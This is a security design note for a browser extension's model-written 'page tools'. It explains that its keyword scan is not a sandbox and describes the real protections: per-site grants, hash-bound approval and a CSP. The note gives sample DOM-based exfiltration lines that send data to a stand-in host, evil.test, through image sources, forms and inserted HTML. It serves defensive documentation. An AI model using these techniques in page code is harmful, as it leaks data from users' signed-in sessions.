# Safety model for page tools

A page tool runs a model-written function inside the user's real, signed-in tab. This page says what actually protects the user and what does not.

## The scan is not a boundary

`src/mint/page-gate.ts` is a text scan. It catches mistakes and obvious misuse (`fetch`, `XMLHttpRequest`, `sendBeacon`, `eval`, `window[...]`, string timers, and so on). It cannot stop a determined author, because JavaScript has too many ways to reach the same capability. A page tool can always send data out through the DOM, and none of these is caught:

- `document.createElement("img" | "script" | "iframe").src = "https://evil.test/?" + data`
- `form.submit()` on a form the tool builds
- `el.insertAdjacentHTML("beforeend", '<img src="https://evil.test/?...">')`

Do not describe the scan as a sandbox, in docs or in the UI.

## What actually protects the user

1. **Per-site grant.** The extension only touches origins the user granted with "Allow this site". No grant, `SITE_NOT_GRANTED`.
2. **Explore window.** Draft runs, snapshots, explore and capture work only while the user has opened a 15 minute explore window for that origin.
3. **Per-version approval, bound to the code.** A published tool version runs only after the user clicks Approve in the popup. The extension computes the approval hash itself: sha256 of a canonical form of `{source, world, urlPattern, origins, signin, needsVisible}`. It ignores any hash the requester sends. Changing the code, world, URL pattern, origins, sign-in check or visibility changes the hash and asks again. The popup shows the first 12 characters, as does the `NEEDS_APPROVAL` message, so the user can compare them.
4. **Network CSP on the USER_SCRIPT world.** `sw.js` calls `chrome.userScripts.configureWorld({csp: "connect-src 'none'; script-src 'self'"})` on every worker start. Checked in Chrome for Testing: `fetch` from the page's own origin succeeds before the call and fails (`TypeError: Failed to fetch`) after it, but only in documents created after the call; tabs already loaded keep the old world until reloaded. `world: "MAIN"` is not covered, which is why it needs a reviewer note.

## Limits to keep in mind

- Approval is only as good as the user's reading of the tool. The popup shows name, version, site and hash, not the code.
- The CSP stops fetch-style requests from the USER_SCRIPT world, not DOM-based exfiltration (above).
- Any process running as the same OS user can talk to the 0600 bridge socket. That is why approval is computed and checked in the extension, not trusted from the request.
